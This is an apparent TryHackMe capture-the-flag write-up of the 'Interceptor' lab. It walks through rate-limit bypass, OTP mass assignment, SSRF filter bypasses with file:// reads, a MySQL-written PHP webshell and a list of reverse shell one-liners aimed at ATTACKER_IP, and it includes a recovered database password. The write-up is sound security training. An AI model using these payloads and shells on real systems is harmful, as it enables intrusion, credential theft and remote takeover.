@@ -1,0 +1,212 @@
+================================================================
+  TryHackMe - Interceptor: Full Attack Chain Summary
+================================================================
+
+TARGET: http://10.113.146.181 (10.114.152.159 after restart)
+
+----------------------------------------------------------------
+STEP 1 — API RECON (Content-Type discovery)
+----------------------------------------------------------------
+Problem:  curl with JSON returned "Email and password are required"
+          even though fields were provided.
+
+Fix:      PHP $_POST only reads multipart/form-data or
+          application/x-www-form-urlencoded, NOT JSON.
+
+Working syntax:
+  curl -i http://TARGET/api_login.php -d 'email=a@b.com&password=test'
+
+----------------------------------------------------------------
+STEP 2 — BACKUP FILE DISCOVERY
+----------------------------------------------------------------
+Found:    /login.php.bak  (plaintext credentials inside)
+
+Lesson:   Always check for .bak, .old, .orig, .swp, ~ backup files.
+  curl http://TARGET/login.php.bak
+
+----------------------------------------------------------------
+STEP 3 — RATE LIMIT BYPASS (X-Forwarded-For)
+----------------------------------------------------------------
+Problem:  "Too many login attempts" error after several tries.
+
+Fix:      Server trusted IP from headers instead of TCP connection.
+          Rotate the header value on each request.
+
+Syntax (curl):
+  curl -H "X-Forwarded-For: 1.2.3.4" http://TARGET/api_login.php ...
+
+Headers to try:
+  X-Forwarded-For: <ip>
+  X-Real-IP: <ip>
+  Client-IP: <ip>
+
+Python (rotate per request):
+  import random
+  ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+  headers = {"X-Forwarded-For": ip, "X-Real-IP": ip}
+
+----------------------------------------------------------------
+STEP 4 — OTP BYPASS (Parameter Pollution / Mass Assignment)
+----------------------------------------------------------------
+Problem:  6-digit OTP required, code unknown.
+
+Vulnerability: Server read is_verified directly from POST body.
+
+Fix:      Inject extra field in multipart request (Burp Repeater):
+
+  ------WebKitFormBoundaryXXXX
+  Content-Disposition: form-data; name="is_verified"
+
+  true
+  ------WebKitFormBoundaryXXXX--
+
+Lesson:   Server should NEVER trust client-supplied verification flags.
+          Always compute state server-side.
+
+----------------------------------------------------------------
+STEP 5 — CLIENT-SIDE RESPONSE INTERCEPTION (Burp)
+----------------------------------------------------------------
+Vulnerability: JavaScript checked data.ok to decide login/redirect.
+               Server state was separate from client state.
+
+Technique:
+  Burp -> Proxy -> Options -> Intercept Server Responses -> Enable
+  Submit form -> Forward request -> Edit response:
+    {"ok":false,...}  =>  {"ok":true,"message":"ok","redirect":"/search.php"}
+  Forward modified response.
+
+Lesson:   Client-side checks are suggestions, not security.
+          Always verify server-side session is actually authenticated.
+
+----------------------------------------------------------------
+STEP 6 — SSRF (Server-Side Request Forgery)
+----------------------------------------------------------------
+Found:    Search feature fetched external URLs server-side.
+
+Bypass:   127.0.0.1 and localhost were blocked.
+          IPv6-mapped IPv4 bypassed the filter:
+          http://[::ffff:7f00:1]/
+
+          `http://1; file:////etc/passwd`
+
+File read via file:// protocol:
+  file:////etc/passwd
+  file:////var/www/html/config.php
+  file:////var/www/html/upload_profile.php
+  file:////root/root.txt
+  file:////home/<user>/user.txt
+
+Port scanning syntax:
+  http://[::ffff:7f00:1]:8080/
+  http://[::ffff:7f00:1]:6379/
+  (compare response/timing vs a closed port like :1)
+
+Alternative SSRF filter bypasses (for reference):
+  http://127.1/
+  http://0/
+  http://[::1]/
+  http://localhost/
+  http://2130706433/  (decimal for 127.0.0.1)
+
+----------------------------------------------------------------
+STEP 7 — FILE READ FINDINGS
+----------------------------------------------------------------
+config.php revealed MySQL credentials:
+  host:     localhost
+  db:       mediahub
+  user:     root
+  password: R9f@K7M!Q2
+
+upload_profile.php revealed upload filter chain:
+  1. Extension allowlist (jpg/jpeg/png/gif)
+  2. Server-side MIME via finfo
+  3. getimagesize() check
+  4. GD re-encoding (imagecreatefromjpeg -> imagejpeg) <-- KILLS polyglots
+  5. Random filename saved to DB
+
+LESSON: GD re-encoding destroys ALL embedded payloads. Abandon
+        upload bypass when re-encoding is present. Move on.
+
+----------------------------------------------------------------
+STEP 8 — phpMyAdmin ACCESS
+----------------------------------------------------------------
+URL:      http://TARGET/phpmyadmin/  (also via SSRF on localhost)
+Login:    root / R9f@K7M!Q2
+
+Useful SQL queries:
+  -- Read files (if secure_file_priv allows)
+  SELECT LOAD_FILE('/root/root.txt');
+  SELECT LOAD_FILE('/etc/shadow');
+
+  -- Write webshell
+  SELECT '<?php system($_GET["cmd"]); ?>'
+  INTO OUTFILE '/var/www/html/shell.php';
+
+  -- Browse database
+  SHOW DATABASES;
+  USE mediahub;
+  SHOW TABLES;
+  SELECT * FROM users;
+
+  -- Check file write restrictions
+  SHOW VARIABLES LIKE 'secure_file_priv';
+  -- Empty string = unrestricted, NULL = disabled, path = restricted to that path
+
+----------------------------------------------------------------
+STEP 9 — WEBSHELL & RCE
+----------------------------------------------------------------
+Write shell via MySQL:
+  SELECT '<?php system($_GET["cmd"]); ?>'
+  INTO OUTFILE '/var/www/html/shell.php';
+
+Access shell:
+  http://TARGET/shell.php?cmd=id
+  http://TARGET/shell.php?cmd=whoami
+  http://TARGET/shell.php?cmd=cat+/root/root.txt
+  http://TARGET/shell.php?cmd=find+/+-name+"flag*"+2>/dev/null
+
+----------------------------------------------------------------
+REVERSE SHELL PAYLOADS (for reference)
+----------------------------------------------------------------
+Start listener first:
+  nc -lvnp 4444
+
+Bash:
+  bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+Python3:
+  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("sh")'
+
+mkfifo (when nc has no -e):
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
+
+Stabilize shell after catching:
+  python3 -c 'import pty; pty.spawn("/bin/bash")'
+  Ctrl+Z
+  stty raw -echo; fg
+  export TERM=xterm
+
+----------------------------------------------------------------
+KEY LESSONS LEARNED
+----------------------------------------------------------------
+1. Always check Content-Type — PHP ignores JSON body in $_POST
+2. Check backup files: .bak, .old, .orig, ~, .swp
+3. Rate limits often key off headers, not real IPs — rotate X-Forwarded-For
+4. is_verified / role / admin fields in POST = mass assignment vuln
+5. JavaScript-enforced controls = client-side only, bypass via Burp response intercept
+6. 127.0.0.1 blocked? Try [::ffff:7f00:1] (IPv6-mapped), 127.1, decimal IP
+7. file:// in SSRF = arbitrary file read (curl-based backends)
+8. GD image re-encoding destroys polyglot shells — don't waste time on it
+9. Database credentials in config.php often reused for phpMyAdmin
+10. MySQL root + INTO OUTFILE = webshell if secure_file_priv is not restricted
+
+================================================================
+  Tools Used
+================================================================
+- Burp Suite (intercept requests + responses, Repeater)
+- curl
+- ffuf (directory enumeration)
+- phpMyAdmin (SQL console)
+- Python requests (brute force script)
+
+================================================================
